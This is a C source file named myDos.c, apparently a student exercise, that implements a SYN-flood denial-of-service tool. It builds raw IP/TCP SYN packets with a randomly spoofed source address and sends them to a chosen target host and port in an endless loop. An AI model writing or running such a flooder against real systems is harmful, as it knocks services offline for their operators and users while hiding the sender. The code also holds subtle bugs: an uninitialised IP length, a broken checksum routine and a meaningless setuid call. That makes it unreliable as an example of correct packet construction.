/*
 * =====================================================================================
 *
 *       Filename:  myDos.c
 *
 *    Description:  
 *
 *        Version:  1.0
 *        Created:  2014年09月27日 13时06分28秒
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  Gaoyuan, sishuiliunian0710@gmail.com
 *        Company:  Class 1204 of Computer Science and Technology
 *
 * =====================================================================================
 */

#include <unistd.h>
#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <linux/tcp.h>

void myAttack(int skfd, struct sockaddr_in *target, unsigned short srcpor);
unsigned short checkSum(unsigned short *addr, int len);

int main(int argc, char *argv[])
{
	int skfd;
	struct sockaddr_in target;
	struct hostent *host;
	const int on = 1;
	unsigned short srcport;

	if (argc != 4 ){
		printf ("Usage:%s target dsport srcport %d \n", argv[0], argc);

		exit (-1);
	}

	bzero(&target, sizeof(struct sockaddr_in));
	target.sin_family = AF_INET;
	target.sin_port = htons(atoi(argv[2]));

	if (inet_aton(argv[1], &target.sin_addr) == 0){
		host = gethostbyname(argv[1]);
		if (host == NULL){
			printf ("Target Name error:%s\n", hstrerror(h_errno));

			exit(-2);
		}
		target.sin_addr = *(struct in_addr *)(host->h_addr_list[0]);
	}

	if (0 > (skfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP))){
		perror("Create Error");

		exit (-2);
	}

	if (0 > (setsockopt(skfd, IPPROTO_IP, IP_HDRINCL, &on, 
						sizeof(on)))){
		perror("IP_HDRINCL failed\n");

		exit(-3);
	}

	setuid(getpid());
	srcport = atoi(argv[3]);
	myAttack(skfd, &target, srcport);

	return EXIT_SUCCESS;
}

void myAttack(int skfd, struct sockaddr_in *target, unsigned short srcport){
	char buf[128] = {0};
	struct ip *ip;
	struct tcphdr *tcp;
	int ip_len;

	ip_len = sizeof(struct ip) + sizeof(struct tcphdr);

	ip = (struct ip *)buf;

	ip->ip_v = IPVERSION;
	ip->ip_hl = sizeof(struct ip) >> 2;
	ip->ip_tos = 0;
	ip->ip_len = htons(ip->ip_len);
	ip->ip_id = 0;
	ip->ip_off = 0;
	ip->ip_ttl = MAXTTL;
	ip->ip_p = IPPROTO_TCP;
	ip->ip_sum = 0;
	ip->ip_dst = target->sin_addr;

	tcp = (struct tcphdr *)(buf + sizeof(struct ip));
	tcp->source = htons(srcport);
	tcp->dest = target->sin_port;
	tcp->seq = random();
	tcp->doff = 5;
	tcp->syn = 1;
	tcp->check = 0;

	while (1){
		printf ("Start\n");
		ip->ip_src.s_addr = random();
		printf ("%d\n", ip->ip_src.s_addr);
		tcp->check = checkSum((unsigned short *)tcp, sizeof(struct tcphdr));
		sendto(skfd, buf, ip_len, 0, (struct sockaddr *)target, sizeof(struct sockaddr_in));
	}
}

unsigned short checkSum(unsigned short *addr, int len){
	register int nleft = len;
	register int sum = 0;
	register short *w = addr;
	short answer = 0;

	while (nleft == 1){
		*(unsigned char *)(&answer) = *(unsigned char *)w;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;

	return answer;
}
